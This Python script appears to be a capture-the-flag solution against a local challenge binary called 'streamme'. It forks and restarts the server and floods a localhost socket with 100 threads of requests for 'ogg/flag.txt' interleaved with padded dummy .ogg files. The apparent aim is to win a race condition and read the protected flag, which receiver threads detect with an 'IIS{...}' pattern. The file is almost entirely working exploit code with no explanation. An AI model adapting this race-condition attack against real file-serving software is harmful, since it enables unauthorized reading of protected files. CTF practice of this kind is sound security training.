import socket
import sys
import os
import re
import time
import threading
import signal

def createFile(number):
	filename = 'ogg/'+ str(number) +'.ogg'
	with(open(filename, 'w+')) as f:
		f.write('Ogg')
		f.seek(number * 1024 - 1)
		f.write("\0")
	return filename

def connectToServer():
	print('connecting to server')
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect(('127.0.0.1', 1337))
	return sock


def checkForFlag(data):
	reg = re.compile("IIS{.*}")
#	reg = re.compile("fool")
	result = reg.search(str(data, 'utf-8'))
	if result:
		print(result.group(0))
		return True
	return False

def receive(sock):
	try:
		while serverRunning:
			data = sock.recv(10000)
#			print(str(data, 'utf-8'))
			if(checkForFlag(data)):
				flagFoundCondition.acquire()
				flagFoundCondition.notify()
				flagFoundCondition.release()
				return checkForFlag(data)
			
			global tryCounter
			tryCounter += 1
			if tryCounter % 100000 == 0:
				print('did ' + str(tryCounter) + ' tries') #intentienally not mutex'd
	except:
		pass
	decreaseThreadCount()

def startThread(sock, target):
	global threadCounter
	counterMutex.acquire()
	threadCounter+= 1
	counterMutex.release()

	thread = threading.Thread(target=target, args=(sock, ))
	thread.setDaemon(True)
	thread.start()
	return thread

def decreaseThreadCount():
	counterMutex.acquire()
	global threadCounter
	threadCounter = threadCounter - 1
	if threadCounter == threadCounter == 1: #thread starting threads still running
		threadsDeadCondition.acquire()
		threadsDeadCondition.notify()
		threadsDeadCondition.release()
	counterMutex.release()

def send(sock):
	try:
		while serverRunning:



			sock.sendall(str.encode('ogg/flag.txt' + '\0'))
			time.sleep(0.2)
			sock.sendall(str.encode(smallFile + '\0'))
			time.sleep(0.2)
			sock.sendall(str.encode(bigFile + '\0'))
			time.sleep(0.2)





	except Exception:
		pass
	decreaseThreadCount()
		
def startServer(ignore):
	global serverPid
	if serverPid != 0:
		try:
			os.kill(serverPid, signal.SIGTERM)
		except OSError:
			pass

	serverPid = os.fork()
	if serverPid == 0:
		print('start server')
		os.execv('./streamme', ['streamme'])
	else:
		os.waitpid(serverPid, 0)
		global serverRunning
		serverRunning = False

	decreaseThreadCount()
def busyWait(ignore):
	while serverRunning:
		i = threadCounter / int(round(time.time()))
	decreaseThreadCount()

def startThreads(ignore):
	while True:
		startThread(0, startServer)
		time.sleep(1)
		sock = connectToServer()
		global serverRunning
		serverRunning = True
		print('connected')

		for i in range(receiveThreads):
			startThread(sock, receive)
		print('started receiving threads')
	
		for i in range (sendThreads):
			thread = startThread(sock, send)
		print('started sending threads')

		for i in range (busyThreads):
			startThread(sock, busyWait)			
		print('started busy threads')
		print('all started')


		counterMutex.acquire()
		while(threadCounter != 1): #this thread still running
			counterMutex.release()
			threadsDeadCondition.acquire()
			threadsDeadCondition.wait()
			threadsDeadCondition.release()
			counterMutex.acquire()

		print('threads dead, restarting')
		print()
		counterMutex.release()
			
	
smallFile = createFile(128)
bigFile = createFile(512)

serverRunning = False
sendThreads = 100
receiveThreads = 5
busyThreads = 0
threadCounter = 0
serverPid = 0

counterMutex = threading.Lock()
threadsDeadCondition = threading.Condition()
startThread(0, startThreads)

flagFoundCondition = threading.Condition()

tryCounter = 0

flagFoundCondition.acquire()
flagFoundCondition.wait()
flagFoundCondition.release()
print('got the flag')